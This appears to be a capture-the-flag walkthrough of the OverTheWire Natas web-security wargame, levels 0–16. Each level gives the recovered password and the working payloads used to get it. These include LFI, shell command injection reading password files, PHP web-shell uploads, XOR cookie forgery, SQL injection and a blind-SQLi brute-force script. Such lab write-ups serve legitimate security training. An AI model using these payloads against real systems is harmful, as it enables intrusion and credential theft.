# Natas

/etc/natas_webpass/natasX

## Level 0

```
Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

CTRL + U
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```

Username: natas1 Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

URL: http://natas1.natas.labs.overthewire.org

## Level 1

```
CTRL + U
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```

Username: natas2 Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

URL: http://natas2.natas.labs.overthewire.org

## Level 2

```
http://natas2.natas.labs.overthewire.org/files/users.txt

natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

Username: natas3 Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

URL: http://natas3.natas.labs.overthewire.org

## Level 3

```
http://natas3.natas.labs.overthewire.org/robots.txt

http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

Username: natas4 Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

URL: http://natas4.natas.labs.overthewire.org

## Level 4

```
find basic auth string

curl -H 'Authorization:Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/

The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

Username: natas5 Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

URL: http://natas5.natas.labs.overthewire.org

## Level 5

```
set cookie loggedin=1

The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

Username: natas6 Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

URL: http://natas6.natas.labs.overthewire.org

## Level 6

```
View sourcecode

http://natas6.natas.labs.overthewire.org/includes/secret.inc

$secret = "FOEIUWGHFEEUHOFUOIU";  <-- submit with this

The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

Username: natas7 Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

URL: http://natas7.natas.labs.overthewire.org

## Level 7

```
CRTL + U
LFI
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

Username: natas8 Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

URL: http://natas8.natas.labs.overthewire.org

## Level 8

```
View sourcecode

reverse

echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));

oubWYf2kBq  <-- submit with this

The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

Username: natas9 Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

URL: http://natas9.natas.labs.overthewire.org

## Level 9

```
View sourcecode

RCE

a;cat /etc/natas_webpass/natas10;ls

t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

```

Username: natas10 Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

URL: http://natas10.natas.labs.overthewire.org

## Level 10

```
bypass filter： preg_match('/[;|&]/',$key)

a /etc/natas_webpass/natas11  <-- grep a-z

/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

Username: natas11 Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

URL: http://natas11.natas.labs.overthewire.org

## Level 11

```
setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
cookie data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=

$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);

XOR reverse
text ^ key = cipherText
cipherText ^ key = text
text ^ cipherText = key

function xor_encrypt($str, $in) {
    $text = $str;
    $key = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$str=base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
$in=json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
echo xor_encrypt($str, $in);

eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

看上去加密的 key 像是 eDWo，然后用它加密需要的 cookie 数据:

```
function xor_encrypt($in) {
    $text = $in;
    $key = 'eDWo';
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$in=json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
echo base64_encode(xor_encrypt($in));

HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5

将这个cookie修改到浏览器中，然后在访问

curl -H 'Authorization:Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==' -b 'data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5' http://natas11.natas.labs.overthewire.org/

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

Username: natas12 Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

URL: http://natas12.natas.labs.overthewire.org

## Level 12

```

upload shell , bp intercept  filename can control: c54hky4d5n.jpg.php

------WebKitFormBoundarylScMiG0t4hOfWB4S

Content-Disposition: form-data; name="filename"

c54hky4d5n.jpg.php

------WebKitFormBoundarylScMiG0t4hOfWB4S

Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"

Content-Type: application/x-php

<?php system('cat /etc/natas_webpass/natas13');?>

trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

Username: natas13 Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

URL: http://natas13.natas.labs.overthewire.org

## Level 13

```
exif_imagetype($_FILES['uploadedfile']['tmp_name'])

需要追加文件头，变成jpeg格式 FF D8 FF E0

------WebKitFormBoundaryYhZxbq2rbm3kbNXS
Content-Disposition: form-data; name="filename"
px8jpk11xa.jpg.php
------WebKitFormBoundaryYhZxbq2rbm3kbNXS
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: image/jpeg
ÿØÿà<?php system('cat /etc/natas_webpass/natas14');?>

访问 http://natas13.natas.labs.overthewire.org/upload/ovhlpy6n50.php

z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

Username: natas14 Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

URL: http://natas14.natas.labs.overthewire.org

## Level 14

```
sql injection

1" or 1=1 -- 1

The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

Username: natas15 Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

URL: http://natas15.natas.labs.overthewire.org

## Level 15

根据提示, natas16 的密码应该在数据表中的 password 字段中。

```
bool sql injection

CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);

确定密码长度为32: username=natas16" and length(password)>=32 -- -
```

创建 python 脚本跑出 natas16 用户的密码(重点注意 mysq 查询时不区分大小写的问题，可以转换成 ascii 码来比较)：

```python
import string
import requests

chars = string.digits + string.ascii_letters
final = ''

for i in range(1, 33):
    for x in chars:
        username = 'natas16" and ascii(substr(password, {i}, 1))=ascii("{x}") -- -'.format(i=i, x=x)
        r = requests.get('http://natas15.natas.labs.overthewire.org', auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'), params={'username': username})

        if 'This user exists' in r.text:
            final += x
            print(final)
            break
print(final)
```

要稍微等待一段时间爆破密码

Username: natas16 Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

URL: http://natas16.natas.labs.overthewire.org

## Level 16

```

```

## Level 17

## Level 18

## Level 19

## Level 20

## Level 21

## Level 22

## Level 23

## Level 24

## Level 25

## Level 26

## Level 27

## Level 28

## Level 29

## Level 30

## Level 31

## Level 32

## Level 33
